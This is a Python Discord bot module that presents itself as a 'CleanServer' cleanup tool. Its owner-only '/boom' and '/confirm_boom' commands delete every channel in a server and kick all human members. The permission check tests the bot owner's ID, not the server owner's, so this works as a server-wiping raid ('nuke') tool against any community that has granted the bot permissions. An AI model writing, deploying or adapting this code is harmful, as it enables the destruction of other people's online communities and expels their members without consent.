import discord
from discord import app_commands
from discord.ext import commands

BOT_OWNER_ID = 828835928331255818  # Replace with your actual Discord user ID

class CleanServer(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    # Bot owner check
    def is_bot_owner(interaction: discord.Interaction) -> bool:
        return interaction.user.id == BOT_OWNER_ID

    @app_commands.command(name="boom", description="(bot owner only)")
    @app_commands.check(is_bot_owner)
    async def boom(self, interaction: discord.Interaction):
        try:
            await interaction.response.send_message(
                "💣 *Bankai... Kurusmash!* Are you sure you want to BOOM the server?\nType `/confirm_boom` to proceed.",
                ephemeral=True
            )
        except discord.InteractionResponded:
            await interaction.followup.send("⚠️ Interaction already responded to.", ephemeral=True)
        except Exception as e:
            await interaction.followup.send(f"❌ Failed to respond: {e}", ephemeral=True)

    @app_commands.command(name="confirm_boom", description="(bot owner only)")
    @app_commands.check(is_bot_owner)
    async def confirm_boom(self, interaction: discord.Interaction):
        try:
            await interaction.response.send_message("🧨 Executing BOOM protocol... *Brace for impact.*", ephemeral=True)
        except discord.InteractionResponded:
            await interaction.followup.send("⚠️ Interaction already responded to.", ephemeral=True)
        except Exception as e:
            await interaction.followup.send(f"❌ Failed to respond: {e}", ephemeral=True)

        guild = interaction.guild

        # Delete all channels
        for channel in guild.channels:
            try:
                await channel.delete()
                print(f"✅ Deleted channel: {channel.name}")
            except Exception as e:
                print(f"❌ Failed to delete channel {channel.name}: {e}")

        # Kick all non-bot members
        for member in guild.members:
            if member.bot:
                continue
            try:
                await member.kick(reason="Server cleanup by BOOM protocol")
                print(f"👢 Kicked member: {member.name}")
            except Exception as e:
                print(f"❌ Failed to kick {member.name}: {e}")

        print("✅ Server cleanup complete.")

async def setup(bot):
    await bot.add_cog(CleanServer(bot))
